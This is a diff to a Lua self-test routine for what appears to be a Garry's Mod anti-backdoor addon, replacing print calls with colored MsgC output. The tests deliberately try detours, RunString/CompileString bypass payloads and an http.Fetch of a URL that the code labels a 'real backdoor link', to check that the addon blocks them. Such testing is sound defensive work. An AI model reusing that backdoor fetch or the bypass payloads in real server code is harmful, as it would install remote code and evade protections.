@@ -26,153 +26,154 @@ function BS:Debug_RunTests(args)
     }
     
     function tests.help()
-        print("\n  Available tests:\n")
+        MsgC(self.colors.header, "\n  Available tests:\n\n")
         for k,v in SortedPairs(tests.text) do
-            print(string.format("     %-18s %s", k, v))
+            local colorParts = string.Explode("::", string.format("     %-18s:: %s", k, v))
+            MsgC(self.colors.key, colorParts[1], self.colors.value, colorParts[2] .. "\n")
         end
-        print("\n  Usage: bs_tests test1 test2 test3 ...\n\n  Leave empty to run all tests.\n")
+        MsgC(self.colors.message, "\n  Usage: bs_tests test1 test2 test3 ...\n\n  Leave empty to run all tests.\n\n")
     end
 
     function tests.detour()
         local bak = self.__G["timer"]["Simple"]
-        print("\n-----> Detour: " .. tests.text["detour"])
+        MsgC(self.colors.header, "\n-----> Detour: " .. tests.text["detour"] .. "\n")
         local function detour()
             bak(0, function() end)
         end
         self.__G["timer"]["Simple"] = detour
         detour()
         if self.__G["timer"]["Simple"] ~= detour then
-            print(" (Pass) Detour undone.")
+            MsgC(self.colors.message, " (Pass) Detour undone.\n")
         else
-            print(" (Fail) The detour still exists!")
+            MsgC(self.colors.message, " (Fail) The detour still exists!\n")
             self.__G["timer"]["Simple"] = bak
         end
         print()
     end
 
     function tests.detour2()
-        print("\n-----> Detour2: " .. tests.text["detour2"])
+        MsgC(self.colors.header, "\n-----> Detour2: " .. tests.text["detour2"] .. "\n")
         local function detourSilent() end
         self.__G["http"]["Post"] = detourSilent
-        print("\n (Wainting) Detouring auto check test result pending... After some seconds: Pass = block execution; Fail = no alerts.\n")
+        MsgC(self.colors.message, "\n (Wainting) Detouring auto check test result pending... After some seconds: Pass = block execution; Fail = no alerts.\n\n")
     end
 
     function tests.getfenv()
-        print("\n-----> getfenv: " .. tests.text["getfenv"])
+        MsgC(self.colors.header, "\n-----> getfenv: " .. tests.text["getfenv"] .. "\n")
         local env = self.__G.getfenv()
         if env == self.__G then
-            print(" (Pass) Our custom environment is out of range.")
+            MsgC(self.colors.message, " (Pass) Our custom environment is out of range.\n")
         else
-            print(" (Fail) Our custom environment is exposed!")
+            MsgC(self.colors.message, " (Fail) Our custom environment is exposed!\n")
         end
         print()
     end
 
     function tests.tostring()
-        print("\n-----> tostring: " .. tests.text["tostring"] .. "\n")
+        MsgC(self.colors.header, "\n-----> tostring: " .. tests.text["tostring"] .. "\n\n")
 
         if string.find(self.__G.tostring(self.__G["jit"]["util"]["funcinfo"]), "builtin") then
-            print(" (Pass) A selected detour (jit.util.funcinfo) is invisible.")
+            MsgC(self.colors.message, " (Pass) A selected detour (jit.util.funcinfo) is invisible.\n")
         else
-            print(" (Fail) A selected detour (jit.util.funcinfo) is visible!")
+            MsgC(self.colors.message, " (Fail) A selected detour (jit.util.funcinfo) is visible!\n")
         end
         print()
     end
 
     function tests.aux.debuggetfenv()
-        print("\n-----> debug.getfenv: " .. tests.text["debug.getfenv"])
+        MsgC(self.colors.header, "\n-----> debug.getfenv: " .. tests.text["debug.getfenv"] .. "\n")
         local function this() end
         local env = self.__G.debug.getfenv(this)
         if env == self.__G then
-            print(" (Pass) Our custom environment is out of range.")
+            MsgC(self.colors.message, " (Pass) Our custom environment is out of range.\n")
         else
-            print(" (Fail) Our custom environment is exposed!")
+            MsgC(self.colors.message, " (Fail) Our custom environment is exposed!\n")
         end
         print()
     end
     tests["debug.getfenv"] = tests.aux.debuggetfenv
 
     function tests.aux.httpFetch()
-        print("\n-----> http.Fetch: " .. tests.text["http.Fetch"])
+        MsgC(self.colors.header, "\n-----> http.Fetch: " .. tests.text["http.Fetch"] .. "\n")
         self.__G.http.Fetch("http://disp0.cf/gas.lua", function (arg) -- Real backdoor link
-            print("\nProhibited code is running inside http.Fetch!")
+            MsgC(self.colors.message, "\nProhibited code is running inside http.Fetch!\n")
         end)
-        print("\n (Waiting) http.Fetch test result pending... Pass = block execution; Fail = run and print message.\n")
+        MsgC(self.colors.message, "\n (Waiting) http.Fetch test result pending... Pass = block execution; Fail = run and print message.\n\n")
     end
     tests["http.Fetch"] = tests.aux.httpFetch
 
     function tests.RunString()
-        print("\n-----> RunString: " .. tests.text["RunString"])
+        MsgC(self.colors.header, "\n-----> RunString: " .. tests.text["RunString"] .. "\n")
         self.__G.RunString([[ BroadcastLua("print('')") print("\nProhibited code is running!")]]);
-        print("\n (Result) Pass = block execution; Fail = Print a message.\n")
+        MsgC(self.colors.message, "\n (Result) Pass = block execution; Fail = Print a message.\n\n")
     end
 
     function tests.RunString2()
-        print("\n-----> RunString2: " .. tests.text["RunString2"])
+        MsgC(self.colors.header, "\n-----> RunString2: " .. tests.text["RunString2"] .. "\n")
         self.__G.CompStrBypass = self.__G.CompileString
         self.__G.RunString([[ print("\n1") local two = CompStrBypass("print(2)") if isfunction(two) then two() end print("\n3")]]);
         self.__G.CompStrBypass = nil
-         print("\n (Result) Pass = 1 and 3 are visible but 2 is blocked; Fail = 1, 2 and 3 are visible.\n")
+        MsgC(self.colors.message, "\n (Result) Pass = 1 and 3 are visible but 2 is blocked; Fail = 1, 2 and 3 are visible.\n\n")
     end
 
     function tests.RunStringEx()
-        print("\n-----> RunStringEx: " .. tests.text["RunStringEx"])
+        MsgC(self.colors.header, "\n-----> RunStringEx: " .. tests.text["RunStringEx"] .. "\n")
         self.__G.RunStringEx([[RunString(print("Prohibited code is running!"))]]);
-        print("\n (Result) Pass = block execution; Fail = Print a message.\n")
+        MsgC(self.colors.message, "\n (Result) Pass = block execution; Fail = Print a message.\n\n")
     end
 
     function tests.aux.debuggetinfo()
-        print("\n-----> debug.getinfo: " .. tests.text["debug.getinfo"] .. "\n")
+        MsgC(self.colors.header, "\n-----> debug.getinfo: " .. tests.text["debug.getinfo"] .. "\n" .. "\n")
         PrintTable(self.__G.debug.getinfo(self.__G.RunString, "flnSu"))
         print()
         if self.__G.debug.getinfo(self.__G.RunString).short_src == "[C]" then
-            print(" (Pass) A selected detour (RunString) is invisible.")
+            MsgC(self.colors.message, " (Pass) A selected detour (RunString) is invisible.\n")
         else
-            print(" (Fail) A selected detour (RunString) is visible!")
+            MsgC(self.colors.message, " (Fail) A selected detour (RunString) is visible!\n")
         end
         print()
     end
     tests["debug.getinfo"] = tests.aux.debuggetinfo
 
     function tests.aux.jitutilfuncinfo()
-        print("\n-----> jit.util.funcinfo: " .. tests.text["jit.util.funcinfo"] .. "\n")
+        MsgC(self.colors.header, "\n-----> jit.util.funcinfo: " .. tests.text["jit.util.funcinfo"] .. "\n\n")
         PrintTable(self.__G.jit.util.funcinfo(self.__G.debug.getinfo))
         print()
         if self.__G.jit.util.funcinfo(self.__G.debug.getinfo)["source"] == nil then
-            print(" (Pass) A selected detour (debug.getinfo) is invisible.")
+            MsgC(self.colors.message, " (Pass) A selected detour (debug.getinfo) is invisible.\n")
         else
-            print(" (Fail) A selected detour (debug.getinfo) is visible!")
+            MsgC(self.colors.message, " (Fail) A selected detour (debug.getinfo) is visible!\n")
         end
         print()
     end
     tests["jit.util.funcinfo"] = tests.aux.jitutilfuncinfo
 
     function tests.CompileFile()
-        print("\n-----> CompileFile: " .. tests.text["CompileFile"])
+        MsgC(self.colors.header, "\n-----> CompileFile: " .. tests.text["CompileFile"] .. "\n")
         local compFile = self.__G.CompileFile("bs/server/modules/debug.lua")
         print()
         if not compFile then
-            print(" (Pass) A file full of prohibited code combinations wasn't compiled.")
+            MsgC(self.colors.message, " (Pass) A file full of prohibited code combinations wasn't compiled.\n")
         else
-            print(" (Fail) A file full of prohibited code combinations was compiled!")
+            MsgC(self.colors.message, " (Fail) A file full of prohibited code combinations was compiled!\n")
         end
         print()
     end
 
     function tests.CompileString()
-        print("\n-----> CompileString: " .. tests.text["CompileString"])
+        MsgC(self.colors.header, "\n-----> CompileString: " .. tests.text["CompileString"] .. "\n")
         local compStr = self.__G.CompileString("RunString(MsgN('Hi))", "TestCode")
         print()
         if compStr == "" then
-            print(" (Pass) A string with prohibited code combinations wasn't compiled.")
+            MsgC(self.colors.message, " (Pass) A string with prohibited code combinations wasn't compiled.\n")
         else
-            print(" (Fail) A string with prohibited code combinations was compiled!")
+            MsgC(self.colors.message, " (Fail) A string with prohibited code combinations was compiled!\n")
         end
         print()
     end
 
     function tests.PersistentTrace()
-        print("\n-----> PersistentTrace: " .. tests.text["PersistentTrace"])
+        MsgC(self.colors.header, "\n-----> PersistentTrace: " .. tests.text["PersistentTrace"] .. "\n")
         self.__G.CompStr = self.__G.CompileString
         self.__G.code = [[ return "2" ]]
         self.__G.timer.Simple(0, function()
@@ -184,12 +185,12 @@ function BS:Debug_RunTests(args)
                 ]])
             end)
         end)
-        print("\n (Waiting) Persistent trace result pending... Pass = Trace with one \"(+) BS - Persistent Trace\"; Fail = Any other trace.\n")
+        MsgC(self.colors.message, "\n (Waiting) Persistent trace result pending... Pass = Trace with one \"(+) BS - Persistent Trace\"; Fail = Any other trace.\n\n")
     end
 
     if #args == 0 or args[1] ~= "help" then
-        print("\n\n---------------------------------------------------------")
-        print("[STARTING TESTS]\n")
+        MsgC(self.colors.header, "\n\n---------------------------------------------------------\n")
+        MsgC(self.colors.header, "[STARTING TESTS]\n\n")
     end
 
     local isRunningAll = #args == 0 and true 
@@ -216,26 +217,26 @@ function BS:Debug_RunTests(args)
             end
         end
         if not found then
-            print("\nTest \"" .. args[1] .. "\" not found...\n")
+            MsgC(self.colors.message, "\nTest \"" .. args[1] .. "\" not found...\n\n")
             tests.help()
         end
     end
 
     if isRunningAll or args[1] ~= "help" then
-        print("\n[FINISHING TESTS]")
-        print("---------------------------------------------------------")
+        MsgC(self.colors.header, "\n[FINISHING TESTS]\n")
+        MsgC(self.colors.header, "---------------------------------------------------------\n")
         if table.Count(printDelayedMsg) > 0 then
-            print("[WAITING FOR]\n")
+            MsgC(self.colors.header, "[WAITING FOR]\n\n")
         end
 
         if isRunningAll or printDelayedMsg["http.Fetch"] then
-            print("--> http.Fetch test result...")
+            MsgC(self.colors.header, "--> http.Fetch test result...\n")
         end
         if isRunningAll or printDelayedMsg["detour2"] then
-            print("--> Detouring auto check test result...")
+            MsgC(self.colors.header, "--> Detouring auto check test result...\n")
         end
         if isRunningAll or printDelayedMsg["PersistentTrace"] then
-            print("--> Persistent check test result...")
+            MsgC(self.colors.header, "--> Persistent check test result...\n")
         end
     end
 end
